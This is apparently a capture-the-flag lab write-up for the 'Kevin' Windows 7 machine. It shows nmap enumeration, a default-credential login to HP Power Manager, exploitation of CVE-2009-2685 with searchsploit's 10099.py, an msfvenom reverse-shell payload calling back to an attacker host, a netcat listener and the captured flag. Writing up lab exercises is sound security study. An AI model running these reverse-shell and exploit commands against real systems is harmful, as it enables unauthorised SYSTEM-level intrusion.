# Kevin - Windows 7 Exploitation Walkthrough

This is a full exploitation walkthrough for the **Kevin** lab machine running Windows 7 Ultimate. The goal was to achieve SYSTEM-level access through web-based exploitation using a known vulnerability in HP Power Manager and capture the final flag.

## Target Information

**IP Address:** 192.168.232.45  
**Operating System:** Windows 7 Ultimate N  
**Hostname:** KEVIN  
**Workgroup:** WORKGROUP  
**Vulnerable Service:** HP Power Manager (GoAhead WebServer) on Port 80  

## Enumeration

Performed an initial Nmap scan:

```bash
nmap -T4 -A 192.168.232.45 -oN nmap
Identified open ports:

80 (HTTP - GoAhead WebServer)

135 (RPC)

139, 445 (SMB)

3389 (RDP)

49152–49159 (MSRPC dynamic ports)

Discovered login panel for HP Power Manager at http://192.168.232.45.

Used default credentials:

pgsql
Copy
Edit
admin : admin
Exploitation - HP Power Manager RCE
Searched for a known exploit:

bash
Copy
Edit
searchsploit HP Power Manager
searchsploit -m 10099.py
Vulnerability: CVE-2009-2685 (Remote Command Execution)

Reverse Shell Payload
Generated a custom reverse shell with msfvenom:

bash
Copy
Edit
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=80 \
-b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
-e x86/alpha_mixed -f c
Injected the payload into the 10099.py exploit.

Gaining Access
Started a listener on the attack machine:

bash
Copy
Edit
rlwrap nc -nlvp 80
Executed the exploit:

bash
Copy
Edit
python2.7 10099.py 192.168.232.45
Gained a reverse shell as:

sql
Copy
Edit
NT AUTHORITY\SYSTEM
Flag
Navigated to:

makefile
Copy
Edit
C:\Users\Administrator\Desktop\proof.txt
Captured the flag:

nginx
Copy
Edit
f9267403b0baf51ae5c66c6d55fd72de
Tools Used
nmap

searchsploit

msfvenom

netcat (nc)

rlwrap

python2.7

Summary
Performed enumeration with Nmap to discover services

Identified vulnerable web interface using default credentials

Leveraged a known exploit (CVE-2009-2685) for RCE

Used a custom reverse shell to get SYSTEM access

Captured the administrator flag

Author
Farhanahmad Quraishi
